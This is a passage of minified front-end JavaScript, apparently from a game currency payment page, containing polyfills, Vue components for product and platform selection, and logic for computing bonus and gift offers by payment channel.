m).port2,s.port1.onmessage=i,o=c(a.postMessage,a,1)):d.addEventListener&&'function'==typeof postMessage&&!d.importScripts?(o=function(t){d.postMessage(t+'','*')},d.addEventListener('message',i,!1)):o=b in l('script')?function(t){f.appendChild(l('script'))[b]=function(){f.removeChild(this),r.call(t)}}:function(t){setTimeout(c(r,t,1),0)}),t.exports={set:h,clear:v}},"5Fu2":function(t,e,n){var i=n("PAFS"),o=n("b8Rm"),s=n("9dxi")('species');t.exports=function(t,e){var n,r=i(t).constructor;return void 0===r||null==(n=i(r)[s])?e:o(n)}},"5MU4":function(t,e,n){var i=n("Bsg+");t.exports=function(t,e){if(!i(t))return t;var n,r;if(e&&'function'==typeof(n=t.toString)&&!i(r=n.call(t)))return r;if('function'==typeof(n=t.valueOf)&&!i(r=n.call(t)))return r;if(!e&&'function'==typeof(n=t.toString)&&!i(r=n.call(t)))return r;throw TypeError("Can't convert object to primitive value")}},"63Ad":function(t,e){t.exports=function(t){return t&&t.__esModule?t:{default:t}}},"6mBe":function(t,e,n){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.default=function(t,e){var n=Object.prototype.toString.call(e).slice(8,-1);return null!=e&&n===t}},"75LO":function(t,e,n){var r=n("UnHL"),i=n("LuBU");n("gRlk")('keys',function(){return function(t){return i(r(t))}})},"7lGJ":function(t,e,n){"use strict";var r=n("X6VK"),i=n("1wfo")(0),o=n("/6rt")([].forEach,!0);r(r.P+r.F*!o,'Array',{forEach:function(t,e){return i(this,t,e)}})},"7zHj":function(t,e,n){"use strict";var r=n("63Ad");n("d3/y"),Object.defineProperty(e,"__esModule",{value:!0}),e.default=void 0;var i=r(n("BUht")),o={name:'wechatPop',data:function(){return{appendIFrame:!1}},mounted:function(){this.appendIFrame=!0},props:{channel:Object,show:Boolean,css:Object},methods:{close:function(){this.$emit('update:show',!1),this.$refs.iframe.src='about:blank'}},watch:{css:function(t){(0,i.default)('#iframe').css(t),(0,i.default)('#iframeWrap').css(t)}}};e.default=o},"8FLA":function(t,e,n){"use strict";var r=n("uDwP"),i=n("fnX1"),o=n("psIG"),s=Object(o.a)(i.default,r.a,r.b,!1,null,null,null);e.default=s.exports},"8MOE":function(t,e,n){"use strict";var r=n("rFBu"),i=n("DZZq"),o=n("psIG"),s=Object(o.a)(i.default,r.a,r.b,!1,null,null,null);e.default=s.exports},"8kJd":function(t,e,n){var r=n("ZVIm")('keys'),i=n("1Alt");t.exports=function(t){return r[t]||(r[t]=i(t))}},"91SL":function(t,e,n){"use strict";function r(){var n=this,t=n.$createElement,r=n._self._c||t;return r('div',{staticClass:"type-radio"},n._l(n.pfs,function(e,t){return r('div',{key:t,staticClass:"radio",class:{'android-radio':'Android'===e,'ios-radio':'IOS'===e,active:n.selected===e},style:{margin:n.styleObj},on:{mousedown:function(t){return n.selectPF(e)}}},[r('p',[n._v(n._s(e))])])}),0)}var i=[];n.d(e,"a",function(){return r}),n.d(e,"b",function(){return i})},"9dxi":function(t,e,n){var r=n("ZVIm")('wks'),i=n("1Alt"),o=n("P56o").Symbol,s='function'==typeof o;(t.exports=function(t){return r[t]||(r[t]=s&&o[t]||(s?o:i)('Symbol.'+t))}).store=r},"9f4c":function(t,e,n){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var i={};e.default=function(t,e,o){void 0===t&&(t=location.href),void 0===e&&(e='&'),void 0===o&&(o='=');var n=t.replace(/.+?\?/,'').replace(/#.*/,''),r=n.split(e);return i[n]||(i[n]=r.reduce(function(e,t){var n=t.indexOf(o);if(-1<n){var r=t.substr(0,n);if(r){var i=t.substr(n+1);try{e[r]=decodeURIComponent(i)}catch(t){e[r]=i}}}return e},{})),i[n]}},"9liC":function(t,e,n){var o=n("b8Rm");t.exports=function(r,i,t){if(o(r),void 0===i)return r;switch(t){case 1:return function(t){return r.call(i,t)};case 2:return function(t,e){return r.call(i,t,e)};case 3:return function(t,e,n){return r.call(i,t,e,n)}}return function(){return r.apply(i,arguments)}}},"9ovy":function(t,e,n){"use strict";var l=n("PAFS"),d=n("Sp5b"),p=n("dVhv"),h=n("Fu0I");n("Wifh")('match',1,function(r,i,u,f){return[function(t){var e=r(this),n=null==t?void 0:t[i];return void 0!==n?n.call(t,e):new RegExp(t)[i](String(e))},function(t){var e=f(u,t,this);if(e.done)return e.value;var n=l(t),r=String(this);if(!n.global)return h(n,r);for(var i,o=n.unicode,s=[],a=n.lastIndex=0;null!==(i=h(n,r));){var c=String(i[0]);''===(s[a]=c)&&(n.lastIndex=p(r,d(n.lastIndex),o)),a++}return 0===a?null:s}]})},"9p7t":function(t,e,n){"use strict";var r=n("X6VK"),i=n("1wfo")(2);r(r.P+r.F*!n("/6rt")([].filter,!0),'Array',{filter:function(t,e){return i(this,t,e)}})},A1KM:function(t,e,n){var r=n("ezc+"),i=n("UnHL"),o=n("8kJd")('IE_PROTO'),s=Object.prototype;t.exports=Object.getPrototypeOf||function(t){return t=i(t),r(t,o)?t[o]:'function'==typeof t.constructor&&t instanceof t.constructor?t.constructor.prototype:t instanceof Object?s:null}},BTfu:function(t,e,n){"use strict";n("LEAW")('fixed',function(t){return function(){return t(this,'tt','','')}})},BUht:function(t,e,n){"use strict";n("d3/y"),Object.defineProperty(e,"__esModule",{value:!0}),e.default=void 0;var r=window.jQuery;e.default=r},BUlT:function(t,e,n){var r=n("mvii"),i=Math.max,o=Math.min;t.exports=function(t,e){return(t=r(t))<0?i(t+e,0):o(t,e)}},BrhN:function(t,e,n){"use strict";var r=n("63Ad");n("7lGJ"),n("Z8gF"),n("V7cS"),n("asZ9"),n("U8p0");var l=r(n("BUht")),f=window.CHANNEL_INFO||{},u={findNum:function(t,e){for(var n=null,r=0;r<e.length;r++)if(e[r].num==t+''){n=e[r];break}return n},findRange:function(t,e){e.sort(function(t,e){return parseInt(t.num)-parseInt(e.num)});var n=null,r=0,i=e.length;if(t>=parseInt(e[i-1].num))return e[i-1];if(t<parseInt(e[r].num))return n;for(r=0;r<i;r++)if(parseInt(e[r].num)<=t&&r+1<i&&parseInt(e[r+1].num)>t){n=e[r];break}return n},mergeDiff:function(t,e){for(var n=1,r=0;r<e.length;r++){u.findNum(e[r].num,t)||(n=0,t.push(e[r]))}return n?t:t.sort(function(t,e){return parseInt(t.num)-parseInt(e.num)})}},i={setInfo:function(t){if(this.info=t,this.uptopresentKeys=[],this.info&&this.info.buycurrency)for(var e in this.info.buycurrency)/uptopresent/.test(e)&&this.uptopresentKeys.push(e)},_filterByChannel:function(o,t,s){var e=this.info.buycurrency,a=o.split(':')[0],c=[],u=[],f=[];for(var n in e)if(n==t){var r=e[n].rule_item;l.default.each(r,function(t,r){if(r.is_limit||!s){for(var e=r.allow_channel.split(','),i=1,n=0;n<e.length;n++)-1==e[n].indexOf(':')&&(e[n]+=':*');for(n=0;n<e.length;n++)if(e[n]===o){c.push(r),i=0;break}i&&l.default.each(e,function(t,e){var n=e.split(':');if(n[0]==a&&'*'==n[1])return u.push(r),i=0,!1}),i&&l.default.each(e,function(t,e){var n=e.split(':');if('*'==n[0]&&'*'==n[1])return f.push(r),i=0,!1})}})}return c.length?c:u.length?u:f.length?f:[]},_getFirstsaveInfo:function(t,e){var n,r=e[0];return'range'==r.rank_type?(n=u.findRange(t,r.present_item))&&(n.__sendNum=n.send_type+''=='2'?parseInt(n.send_num):parseInt(n.send_rate)*parseInt(n.num)/100):(n=u.findNum(t,r.present_item))&&(n.__sendNum=n.send_type+''=='2'?parseInt(n.send_num):parseInt(n.send_rate)*parseInt(n.num)/100),n},_getUptopresentInfo:function(t,e){var n,r,i,o=[],s=[];for(n=0;n<e.length;n++)(r=e[n].is_limit)&&('no'!=r?o.push(e[n]):s.push(e[n]));if(o.length){var a=[];for(n=0;n<o.length;n++)r=o[n].rank_type,o[n].present_item=u.mergeDiff(o[n].present_item,s[0].present_item),'range'==r?(i=u.findRange(t,o[n].present_item))&&(i.__sendNum=i.send_type+''=='2'?parseInt(i.send_num):parseInt(i.send_rate)*parseInt(i.num)/100,i.is_limit=o[n].is_limit,a.push(i)):(i=u.findNum(t,o[n].present_item))&&(i.__sendNum=i.send_type+''=='2'?parseInt(i.send_num):parseInt(i.send_rate)*parseInt(i.num)/100,i.is_limit=o[n].is_limit,a.push(i));return a.length?a:null}var c=e[0];return'range'==c.rank_type?(i=u.findRange(t,c.present_item))&&(i.__sendNum=i.send_type+''=='2'?parseInt(i.send_num):parseInt(i.send_rate)*parseInt(i.num)/100):(i=u.findNum(t,c.present_item))&&(i.__sendNum=i.send_type+''=='2'?parseInt(i.send_num):parseInt(i.send_rate)*parseInt(i.num)/100),i},_mergeDrmInfo:function(t,e){var n;if(t&&(n=l.default.extend(!0,{},t)),e)if(e instanceof Array)for(var r=0;r<e.length;r++){var i=e[r];n?(n.product_item=n.product_item.concat(i.product_item),n.__sendNum+=i.__sendNum,i.send_ext&&(n.send_ext=i.send_ext)):n=i}else n?(n.product_item=n.product_item.concat(e.product_item),n.__sendNum+=e.__sendNum,e.send_ext&&(n.send_ext=e.send_ext)):n=e;return n&&n.send_ext&&(n.send_ext=n.send_ext.replace('限1次',window.langResource.xianyici||'One time offer'),n.send_ext=n.send_ext.replace('任1次',window.langResource.renyici||'One time offer')),n},_mergeUptopresentInfo:function(t){for(var e,n=t.length,r=0;r<n;r++){var i=t[r];if(i)if((i=JSON.parse(JSON.stringify(i)))instanceof Array)for(var o=0;o<i.length;o++){var s=i[o];e?(e.product_item=e.product_item.concat(s.product_item),e.__sendNum+=s.__sendNum,s.send_ext&&(e.send_ext=s.send_ext)):e=s}else e?(e.product_item=e.product_item.concat(i.product_item),e.__sendNum+=i.__sendNum,i.send_ext&&(e.send_ext=i.send_ext)):e=i}if(e&&e.product_item&&e.product_item.length){var a={};e.product_item.forEach(function(t){if(t)if(a[t.id]){var e=parseInt(a[t.id].num)+parseInt(t.num);a[t.id].num=e}else a[t.id]=JSON.parse(JSON.stringify(t))});var c=[];for(var u in a)a.hasOwnProperty(u)&&c.push(a[u]);e.product_item=c}return e},getSendCount:function(t,e){e=f[e]?f[e].pm:e;var n,r,i=this._filterByChannel(e,'firstsave'),o=[];if(0<this.uptopresentKeys.length)for(var s=0;s<this.uptopresentKeys.length;s++){var a=this.uptopresentKeys[s],c=this._filterByChannel(e,a,1);if(c.length){var u=this._getUptopresentInfo(t,c);o.push(u)}}return i.length&&(n=this._getFirstsaveInfo(t,i)),o.length&&(r=this._mergeUptopresentInfo(o)),this._mergeDrmInfo(n,r)},getMarketingTips:function(){var t=this.info.buycurrency,e='';return t.title?e=t.title:t.uptopresent&&t.uptopresent.title?e=t.uptopresent.title:t.firstsave&&t.firstsave.title&&(e=t.firstsave.title),e}};t.exports=i},"Bsg+":function(t,e){t.exports=function(t){return'object'==typeof t?null!==t:'function'==typeof t}},C5nI:function(t,e,n){var r=n("Qno1");t.exports=function(t,e){return new(r(t))(e)}},CLuC:function(t,e,n){var r=n("P56o").document;t.exports=r&&r.documentElement},Cmsx:function(t,e,n){var r=n("n+VH");t.exports=Object('z').propertyIsEnumerable(0)?Object:function(t){return'String'==r(t)?t.split(''):Object(t)}},DHwd:function(t,e,n){"use strict";n("d3/y"),Object.defineProperty(e,"__esModule",{value:!0}),e.default=void 0;var r={name:'platselect',props:{plats:Array},data:function(){return{pfs:this.plats?this.plats:[],selected:this.plats[0],styleObj:1===this.plats.length?0:''}},created:function(){this.selectPF(this.plats[0])},methods:{selectPF:function(t){this.selected=t,this.$emit('select',t)}}};e.default=r},DOCd:function(t,e,n){"use strict";n.r(e);var r=n("BUht"),i=n.n(r);e.default=function(t){var e="<div id=\"toast-box\" class=\"pop-toast\">"+(t.msg||'')+"</div>";i()('#toast-box').remove(),i()('body').append(i()(e)),i()('#toast-box').fadeIn(500),setTimeout(function(){i()('#toast-box').fadeOut(500)},t.timeout||2e3)}},DZZq:function(t,e,n){"use strict";var r=n("vEUd"),i=n.n(r);e.default=i.a},DbwS:function(t,e,n){"use strict";function r(){}function l(t){var e;return!(!m(t)||'function'!=typeof(e=t.then))&&e}function i(f,n){if(!f._n){f._n=!0;var r=f._c;x(function(){for(var c=f._v,u=1==f._s,t=0,e=function(t){var e,n,r,i=u?t.ok:t.fail,o=t.resolve,s=t.reject,a=t.domain;try{i?(u||(2==f._h&&L(f),f._h=1),!0===i?e=c:(a&&a.enter(),e=i(c),a&&(a.exit(),r=!0)),e===t.promise?s(D('Promise-chain cycle')):(n=l(e))?n.call(e,o,s):o(e)):s(c)}catch(t){a&&!r&&a.exit(),s(t)}};r.length>t;)e(r[t++]);f._c=[],f._n=!1,n&&!f._h&&N(f)})}}function o(t){var e=this;e._d||(e._d=!0,(e=e._w||e)._v=t,e._s=2,e._a||(e._a=e._c.slice()),i(e,!0))}var s,a,c,u,f=n("wEu9"),d=n("P56o"),p=n("9liC"),h=n("OFVL"),v=n("X6VK"),m=n("Bsg+"),g=n("b8Rm"),y=n("EusA"),_=n("HqX2"),b=n("5Fu2"),w=n("5BMI").set,x=n("XDzM")(),C=n("gtO+"),I=n("Yvte"),O=n("ROCd"),S=n("khIB"),P='Promise',D=d.TypeError,E=d.process,T=E&&E.versions,k=T&&T.v8||'',M=d[P],j='process'==h(E),R=a=C.f,A=!!function(){try{var t=M.resolve(1),e=(t.constructor={})[n("9dxi")('species')]=function(t){t(r,r)};return(j||'function'==typeof PromiseRejectionEvent)&&t.then(r)instanceof e&&0!==k.indexOf('6.6')&&-1===O.indexOf('Chrome/66')}catch(t){}}(),N=function(o){w.call(d,function(){var t,e,n,r=o._v,i=F(o);if(i&&(t=I(function(){j?E.emit('unhandledRejection',r,o):(e=d.onunhandledrejection)?e({promise:o,reason:r}):(n=d.console)&&n.error&&n.error('Unhandled promise rejection',r)}),o._h=j||F(o)?2:1),o._a=void 0,i&&t.e)throw t.v})},F=function(t){return 1!==t._h&&0===(t._a||t._c).length},L=function(e){w.call(d,function(){var t;j?E.emit('rejectionHandled',e):(t=d.onrejectionhandled)&&t({promise:e,reason:e._v})})},U=function(t){var n,r=this;if(!r._d){r._d=!0,r=r._w||r;try{if(r===t)throw D("Promise can't be resolved itself");(n=l(t))?x(function(){var e={_w:r,_d:!1};try{n.call(t,p(U,e,1),p(o,e,1))}catch(t){o.call(e,t)}}):(r._v=t,r._s=1,i(r,!1))}catch(t){o.call({_w:r,_d:!1},t)}}};A||(M=function(t){y(this,M,P,'_h'),g(t),s.call(this);try{t(p(U,this,1),p(o,this,1))}catch(t){o.call(this,t)}},(s=function(){this._c=[],this._a=void 0,this._s=0,this._d=!1,this._v=void 0,this._h=0,this._n=!1}).prototype=n("+edc")(M.prototype,{then:function(t,e){var n=R(b(this,M));return n.ok='function'!=typeof t||t,n.fail='function'==typeof e&&e,n.domain=j?E.domain:void 0,this._c.push(n),this._a&&this._a.push(n),this._s&&i(this,!1),n.promise},catch:function(t){return this.then(void 0,t)}}),c=function(){var t=new s;this.promise=t,this.resolve=p(U,t,1),this.reject=p(o,t,1)},C.f=R=function(t){return t===M||t===u?new c:a(t)}),v(v.G+v.W+v.F*!A,{Promise:M}),n("jPEw")(M,P),n("E8p1")(P),u=n("R5TD")[P],v(v.S+v.F*!A,P,{reject:function(t){var e=R(this);return(0,e.reject)(t),e.promise}}),v(v.S+v.F*(f||!A),P,{resolve:function(t){return S(f&&this===u?M:this,t)}}),v(v.S+v.F*!(A&&n("zlqh")(function(t){M.all(t).catch(r)})),P,{all:function(t){var s=this,e=R(s),a=e.resolve,c=e.reject,n=I(function(){var r=[],i=0,o=1;_(t,!1,function(t){var e=i++,n=!1;r.push(void 0),o++,s.resolve(t).then(function(t){n||(n=!0,r[e]=t,--o||a(r))},c)}),--o||a(r)});return n.e&&c(n.v),e.promise},race:function(t){var e=this,n=R(e),r=n.reject,i=I(function(){_(t,!1,function(t){e.resolve(t).then(n.resolve,r)})});return i.e&&r(i.v),n.promise}})},E2HC:function(t,e,n){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var r=n("6mBe");e.default=function(t){return r.default('Object',t)&&null!==t}},E7Vc:function(t,e){t.exports=function(t){try{return!!t()}catch(t){return!0}}},E8p1:function(t,e,n){"use strict";var r=n("P56o"),i=n("U1KF"),o=n("GGqZ"),s=n("9dxi")('species');t.exports=function(t){var e=r[t];o&&e&&!e[s]&&i.f(e,s,{configurable:!0,get:function(){return this}})}},Entu:function(t,e,n){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.default=function(t){for(var e=1;e<=arguments.length;e++)if(arguments[e])for(var n in arguments[e])Object.prototype.hasOwnProperty.call(arguments[e],n)&&(t[n]=arguments[e][n]);return t}},EusA:function(t,e){t.exports=function(t,e,n,r){if(!(t instanceof e)||void 0!==r&&r in t)throw TypeError(n+': incorrect invocation!');return t}},Fu0I:function(t,e,n){"use strict";var i=n("OFVL"),o=RegExp.prototype.exec;t.exports=function(t,e){var n=t.exec;if('function'==typeof n){var r=n.call(t,e);if('object'!=typeof r)throw new TypeError('RegExp exec method returned something other than an Object or null');return r}if('RegExp'!==i(t))throw new TypeError('RegExp#exec called on incompatible receiver');return o.call(t,e)}},GCOZ:function(t,e){t.exports=function(t){if(null==t)throw TypeError("Can't call method on  "+t);return t}},GGM0:function(t,e,n){"use strict";var r=n("7zHj"),i=n.n(r);e.default=i.a},GGqZ:function(t,e,n){t.exports=!n("E7Vc")(function(){return 7!=Object.defineProperty({},'a',{get:function(){return 7}}).a})},Gt5v:function(t,e,n){"use strict";var r=n("X1H8"),i=n("pime"),o=n("psIG"),s=Object(o.a)(i.default,r.a,r.b,!1,null,null,null);e.default=s.exports},H0Xg:function(t,e,n){"use strict";function r(){var r=this,t=r.$createElement,i=r._self._c||t;return i('ul',r._l(r.datas,function(n){return i('li',{key:n.id,class:{active:n.id===r.selected.id},attrs:{cr:'amount_select.'+n.num},on:{click:function(t){return r.selectProduct(n)}}},[n.mktips?i('div',{staticClass:"type-labels"},[r._v(r._s(n.mktips))]):r._e(),r._v(" "),i('div',{staticClass:"container"},[i('div',{staticClass:"shop-box"},[i('p',{staticClass:"num"},[i('img',{staticClass:"icon",attrs:{src:n.smallicon}}),r._v(r._s(n.num)),n.send?i('span',{staticClass:"bonus"},[r._v("+"+r._s(n.send))]):r._e()])]),r._v(" "),i('div',{staticClass:"shop-pic"},[i('img',{staticStyle:{width:"70%","max-width":"100%"},attrs:{src:n.icon,alt:"img"}})]),r._v(" "),n.gift_icon&&n.gift_icon.length?i('div',{staticClass:"mess-box pic-mess-box"},[i('span',{staticClass:"label-gift"},[r._v(r._s(r.lanRes.gift||'Gift'))]),r._v(" "),i('div',{staticClass:"gift-pic-box"},[1===n.gift_icon.length?i('div',{staticClass:"gift-item single-gift-item"},[i('div',{staticClass:"img wImg"},[i('img',{staticClass:"wPic",attrs:{src:n.gift_icon[0]}})]),r._v(" "),i('p',[r._v(r._s(n.gift[0]))])]):i('div',{staticClass:"gift-pic-box"},r._l(n.gift_icon,function(t,e){return i('div',{key:e,staticClass:"gift-item"},[i('div',{staticClass:"img wImg"},[i('img',{staticClass:"wPic",attrs:{src:t}})]),r._v(" "),i('p',[r._v(r._s(n.gift[e]&&n.gift[e].substr(0,4)))])])}),0)])]):r._e(),r._v(" "),n.gift&&n.gift.length&&!n.gift_icon&&!n.gift_icon.length?i('div',{staticClass:"mess-box"},[i('p',{staticClass:"item"},[r._v("Gift："),i('span',[r._v(r._s(n.gift.length)+" items")])]),r._v(" "),i('p',{staticClass:"detail"},[r._v(r._s(n.gift.join(',')))])]):r._e(),r._v(" "),i('div',{staticClass:"price-box",class:{'one-price':!n.ofprice}},[i('p',{staticClass:"money"},[r._v(r._s(n.fprice))]),r._v(" "),n.ofprice?i('p',{staticClass:"moneyed"},[r._v(r._s(n.ofprice))]):r._e()])])])}),0)}var i=[];n.d(e,"a",function(){return r}),n.d(e,"b",function(){return i})},HWsP:function(t,e,n){t.exports=!n("GGqZ")&&!n("E7Vc")(function(){return 7!=Object.defineProperty(n("mggL")('div'),'a',{get:function(){return 7}}).a})},HcM6:function(t,e,n){"use strict";n.r(e);var r=n("91SL"),i=n("2Qao");for(var o in i)'default'!==o&&function(t){n.d(e,t,function(){return i[t]})}(o);var s=n("psIG"),a=Object(s.a)(i.default,r.a,r.b,!1,null,null,null);e.default=a.exports},HdWb:function(t,e,n){"use strict";var r=n("hhdQ"),i=n("1MHo"),o=n("psIG"),s=Object(o.a)(i.default,r.a,r.b,!1,null,null,null);e.default=s.exports},HkTM:function(t,e,n){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var s=n("oGmy");e.default=function(t,e){var n,r=0;if(s.default(t)){var i=t.length;for(n=t[0];r<i&&!1!==e.call(n,n,r,t);n=t[++r]);}else for(var o in t)if(!1===e.call(t[o],t[o],o,t))break;return t}},HqX2:function(t,e,n){var d=n("9liC"),p=n("iJnn"),h=n("2LOZ"),v=n("PAFS"),m=n("Sp5b"),g=n("pB2m"),y={},_={};(e=t.exports=function(t,e,n,r,i){var o,s,a,c,u=i?function(){return t}:g(t),f=d(n,r,e?2:1),l=0;if('function'!=typeof u)throw TypeError(t+' is not iterable!');if(h(u)){for(o=m(t.length);l<o;l++)if((c=e?f(v(s=t[l])[0],s[1]):f(t[l]))===y||c===_)return c}else for(a=u.call(t);!(s=a.next()).done;)if((c=p(a,f,s.value,e))===y||c===_)return c}).BREAK=y,e.RETURN=_},I2RX:function(t,e,n){"use strict";e.a=function(t){var e=window.localStorage&&window.localStorage.getItem(t),n=null;if(e)try{n=JSON.parse(e)}catch(t){}return n}},Ibj2:function(t,e){t.exports={}},IdFN:function(t,e){e.f={}.propertyIsEnumerable},JGfN:function(t,e,n){t.exports=n("ZVIm")('native-function-to-string',Function.toString)},JKhl:function(t,e,n){"use strict";n.d(e,"a",function(){return o});var r=n("9f4c"),i=n.n(r);function o(t){var e=i()().usePC,n=/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent);return!(!t&&'1'===e)&&n}},Jeu6:function(t,e,n){n("t91x"),n("lQyR"),n("W1QL"),n("DbwS"),n("jPba"),n("OU6u"),t.exports=n("R5TD").Promise},"Jww/":function(t,e,n){"use strict";function _(){return this}var b=n("wEu9"),w=n("X6VK"),x=n("sU/p"),C=n("tjmq"),I=n("Ibj2"),O=n("puZ4"),S=n("jPEw"),P=n("A1KM"),D=n("9dxi")('iterator'),E=!([].keys&&'next'in[].keys()),T='values';t.exports=function(t,e,n,r,i,o,s){O(n,e,r);function a(t){if(!E&&t in h)return h[t];switch(t){case"keys":case T:return function(){return new n(this,t)}}return function(){return new n(this,t)}}var c,u,f,l=e+' Iterator',d=i==T,p=!1,h=t.prototype,v=h[D]||h["@@iterator"]||i&&h[i],m=v||a(i),g=i?d?a('entries'):m:void 0,y='Array'==e&&h.entries||v;if(y&&(f=P(y.call(new t)))!==Object.prototype&&f.next&&(S(f,l,!0),b||'function'==typeof f[D]||C(f,D,_)),d&&v&&v.name!==T&&(p=!0,m=function(){return v.call(this)}),b&&!s||!E&&!p&&h[D]||C(h,D,m),I[e]=m,I[l]=_,i)if(c={values:d?m:a(T),keys:o?m:a("keys"),entries:g},s)for(u in c)u in h||x(h,u,c[u]);else w(w.P+w.F*(E||p),e,c);return c}},Jzx5:function(t,e,n){"use strict";function r(){var t=this,e=t.$createElement,n=t._self._c||e;return n('div',[1===t.isNotification&&t.visible?n('div',{staticClass:"notification-message",class:[t.modColorClass]},[n('p',{staticClass:"mess"},[n('span',{staticStyle:{"font-weight":"100"}},[n('span',{staticClass:"icon iconfont iconicon-message"}),t._v(" "),n('span',[t._v(t._s(t.notifyTitle||'Notification'))]),t._v("\n                : "+t._s(t.text)+"\n            ")])]),t._v(" "),n('div',{staticClass:"block"},[t.allowMore?n('p',{staticClass:"more",on:{click:t.showMoreText}},[t._t("more")],2):t._e(),t._v(" "),n('div',{staticClass:"close icon iconfont iconicon-close",on:{click:t.closeMessage}})])]):t._e(),t._v(" "),0===t.isNotification?n('div',{staticClass:"market-message",class:[t.modColorClass],staticStyle:{cursor:"pointer"},on:{click:t.jumpToEvent}},[n('div',{staticClass:"mess"},[n('div',{staticClass:"dowebok",staticStyle:{"white-space":"nowrap"}},[t._v(t._s(t.text))])]),t._v(" "),n('img',{attrs:{src:t.propImg}})]):t._e()])}var i=[];n.d(e,"a",function(){return r}),n.d(e,"b",function(){return i})},"K/PF":function(t,e,n){"use strict";var r=n("OfmW"),i=n("VVFi"),o=n("Ibj2"),s=n("ml72");t.exports=n("Jww/")(Array,'Array',function(t,e){this._t=s(t),this._i=0,this._k=e},function(){var t=this._t,e=this._k,n=this._i++;return!t||n>=t.length?(this._t=void 0,i(1)):i(0,'keys'==e?n:'values'==e?t[n]:[n,t[n]])},'values'),o.Arguments=o.Array,r('keys'),r('values'),r('entries')},K72U:function(t,e,n){"use strict";n("d3/y"),Object.defineProperty(e,"__esModule",{value:!0}),e.default=void 0;var r=window.Vue;e.default=r},KFSm:function(t,e){t.exports=function(t,e,n){var r=void 0===n;switch(e.length){case 0:return r?t():t.call(n);case 1:return r?t(e[0]):t.call(n,e[0]);case 2:return r?t(e[0],e[1]):t.call(n,e[0],e[1]);case 3:return r?t(e[0],e[1],e[2]):t.call(n,e[0],e[1],e[2]);case 4:return r?t(e[0],e[1],e[2],e[3]):t.call(n,e[0],e[1],e[2],e[3])}return t.apply(n,e)}},LEAW:function(t,e,n){function r(t,e,n,r){var i=String(s(t)),o='<'+e;return''!==n&&(o+=' '+n+'="'+String(r).replace(a,'&quot;')+'"'),o+'>'+i+'</'+e+'>'}var i=n("X6VK"),o=n("E7Vc"),s=n("GCOZ"),a=/"/g;t.exports=function(e,t){var n={};n[e]=t(r),i(i.P+i.F*o(function(){var t=''[e]('"');return t!==t.toLowerCase()||3<t.split('"').length}),'String',n)}},LuBU:function(t,e,n){var r=n("at5L"),i=n("fQty");t.exports=Object.keys||function(t){return r(t,i)}},"M/4x":function(t,e,n){var r=Date.prototype,i='Invalid Date',o='toString',s=r[o],a=r.getTime;new Date(NaN)+''!=i&&n("sU/p")(r,o,function(){var t=a.call(this);return t==t?s.call(this):i})},M8Dk:function(t,e,n){"use strict";n.r(e);var r,i,o=n("K72U"),s=n.n(o),a=n("nDPO"),c=(r=function(t,e){return(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])})(t,e)},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});function u(){return null!==i&&i.apply(this,arguments)||this}var m=new(i=a.a,c(u,i),u.prototype.getBuyType=function(){return'SAVE'},u),f=n("JKhl"),l=n("8MOE"),d=n("WyNz"),p=n("lusK"),h=n("Pf6g"),v=n("8FLA"),g=n("W3jp"),y=n("Gt5v"),_=n("VrDC"),b=n("HdWb"),w=n("Y6fs"),x=n.n(w),C=n("ifxA"),I=n("DOCd"),O=(n("WbYP"),n("QMnT")),S=n("Entu"),P=n.n(S),D=n("BUht"),E=n.n(D),T=n("9f4c"),k=n.n(T),M=n("P9Fj"),j=window,R=j.__PAY_INFO,A=m.getChannelData(),N=m.getBindUser(),F=m.getGameUsers(),L=m.getNeedSelectPF(),U=j.report,B=Object(f.a)(),V=new s.a({el:'#app',data:{tabsData:A,wxopenid:'',payClick:0,activeTab:{},currentList:[],currentProduct:{},bindUser:N,dlist:F,platforms:L,showFindOpenid:!1,showQrPop:!1,showErrorBox:!1,isEditStatus:!0,showWechatPop:!1,showIframePop:!1,showResPop:!1,noResFound:!1,queryingPop:!1,resQueryPop:!1,payErrorInfo:'',birthValidate:!1,showDrmDesc:!1,cssObj:{},msgObj:{},gameStore:m,checkedAgreementArray:[!1,!1,!1]},computed:{clazz:function(){return this.showRes?' buy-suc':'game-ticket game-wrap'}},mounted:function(){var t=/micromessenger/.test(navigator.userAgent.toLowerCase());if(A.some(function(t){return t.isWechat})&&t){var e=k()();e.wxopenid?this.wxopenid=e.wxopenid:j.midas.getWxopenid({sandbox:j.__PAY_INFO.sandbox,appid:j.__PAY_INFO.appid})}var n=j.__Report_INFO.countryCode.toUpperCase();-1===j.complianceWithDataCountryList.indexOf(n)&&(this.checkedAgreementArray=[!1,!1],E()('#dataRightCheckbox').remove()),document.getElementById('app').style.display='block';var r=m.getMsgUrl();if(r){var i=document.createElement('iframe');i.style.display='none',i.setAttribute('src',r),document.body.appendChild(i)}},methods:{onClickChechBox:function(t,e){'A'!==e.tagName?(U.click("payment_confirm_terms_"+(t+1)),this.checkedAgreementArray.splice(t,1,!this.checkedAgreementArray[t])):U.click("payment_confirm_terms_"+(t+1)+"_URL")},onTabActive:function(t){var e=this;if(m.setCurrentChannel(t),this.activeTab=t,this.currentList=t.productDatas,this.currentList.every(function(t){return t.productid!==e.currentProduct.id})&&(this.currentProduct=this.currentList[0]),this.showDrmDesc=t.showDrmDesc,m.setProductItem(this.currentProduct),m.getCurrentChannel().needRCVerify){var r=this;j.addEventListener('message',function(t){var e=t.origin;if(/\.qq\.com$/.test(e)||/midasbuy\.com$/.test(e))try{var n=JSON.parse(t.data);'popupVerify'===n.msg&&r.hideIframe(),'cancelVerify'!==n.msg&&'VerifyOK'!==n.msg||r.showIframe()}catch(t){}},!1)}},hideIframe:function(){E()('#iframeWrap .close').hide()},showIframe:function(){E()('#iframeWrap .close').show()},onSelectPF:function(t){var e=this.platforms[t];m.setPF(e.pf,e.zoneid)},onSelectProduct:function(t){this.currentProduct=t,m.setProductItem(this.currentProduct)},onEdit:function(t){this.isEditStatus=t},showFindOpenidPop:function(){this.showFindOpenid=!0},onLogin:function(t){this.payClick=0,this.birthValidate=!1,m.getDrmInfoByUserInfo(t),m.fetchActiveData();var 